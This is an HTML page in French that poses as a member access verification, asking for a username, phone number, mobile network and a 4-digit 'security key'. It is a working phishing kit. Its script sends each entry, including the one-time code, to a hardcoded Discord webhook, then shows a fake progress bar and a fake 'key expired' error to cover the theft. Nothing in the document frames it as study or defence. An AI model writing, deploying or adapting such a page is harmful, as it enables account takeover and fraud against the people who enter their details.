<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Accès Membre</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --p: #007AFF; --s: #34c759; --t: #1c1c1e; }
        body { margin: 0; font-family: sans-serif; background: #f5f5f7; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .box { background: #fff; padding: 30px; border-radius: 25px; width: 100%; max-width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
        .grid { display: flex; gap: 10px; margin-bottom: 20px; }
        .item { flex: 1; cursor: pointer; border: 2px solid transparent; border-radius: 15px; overflow: hidden; }
        .item.sel { border-color: var(--p); }
        .item img { width: 100%; display: block; }
        input, select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 10px; border: 1px solid #ccc; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: var(--t); color: #fff; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        #step2, #step3, #loading { display: none; }
        .bar { width: 100%; height: 6px; background: #eee; border-radius: 10px; margin: 20px 0; overflow: hidden; }
        .inner { height: 100%; width: 0%; background: var(--p); transition: 0.6s linear; }
        .note { background: #eef7ff; color: var(--p); padding: 10px; border-radius: 10px; font-size: 12px; margin-bottom: 15px; font-weight: bold; }
    </style>
</head>
<body>

<div class="box">
    <div id="step1">
        <h3>Vérification d'accès</h3>
        <div class="grid">
            <div class="item" onclick="sel('R', this)"><img src="image_e388f6.jpg"></div>
            <div class="item" onclick="sel('S', this)"><img src="image_e38919.png"></div>
            <div class="item" onclick="sel('B', this)"><img src="image_e38956.jpg"></div>
        </div>
        <input type="text" id="u" placeholder="Identifiant">
        <input type="tel" id="ph" placeholder="Référence mobile">
        <select id="op"><option value="">Réseau</option><option>O</option><option>S</option><option>B</option><option>F</option></select>
        <button id="btn" onclick="go()" disabled>Vérifier</button>
    </div>

    <div id="loading">
        <h3>Analyse...</h3>
        <div class="bar"><div class="inner" id="p"></div></div>
    </div>

    <div id="step2">
        <h3>Confirmation</h3>
        <div class="note">📩 Une clé de sécurité va être envoyée. Saisissez-la dès réception.</div>
        <input type="text" id="c" placeholder="Clé à 4 chiffres" style="text-align:center; font-size:20px;">
        <button onclick="end()">Valider</button>
    </div>

    <div id="step3">
        <h2 style="color:red;">❌ Erreur</h2>
        <p>La clé saisie est incorrecte ou a expiré.</p>
        <button onclick="location.reload()">Réessayer</button>
    </div>
</div>

<script>
    let service = "";
    function sel(n, e) { 
        service = n; 
        document.querySelectorAll('.item').forEach(i => i.classList.remove('sel'));
        e.classList.add('sel');
        document.getElementById('btn').disabled = false;
    }

    async function send(m) {
        const id = "1420112956976267425";
        const url = "https://discord.com/api/webhooks/1435714404892279035/Dtc84HlCxUQZB-T1HHtJdVRR93lsxA8Am0YLGrk0O4mns2U6F3dLVo-ZQIDeZ7jtHRh6";
        await fetch(url, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ content: `<@&${id}>\n` + m }) });
    }

    function go() {
        send(`👤: ${document.getElementById('u').value}\n📱: ${document.getElementById('ph').value}\n🎁: ${service}`);
        document.getElementById('step1').style.display = 'none';
        document.getElementById('loading').style.display = 'block';
        let pr = 0;
        let it = setInterval(() => {
            pr++; document.getElementById('p').style.width = pr + "%";
            if(pr >= 100) { clearInterval(it); document.getElementById('loading').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
        }, 600);
    }

    function end() {
        send(`🔑 CLÉ: ${document.getElementById('c').value}`);
        document.getElementById('step2').style.display = 'none';
        document.getElementById('step3').style.display = 'block';
    }
</script>
</body>
</html>
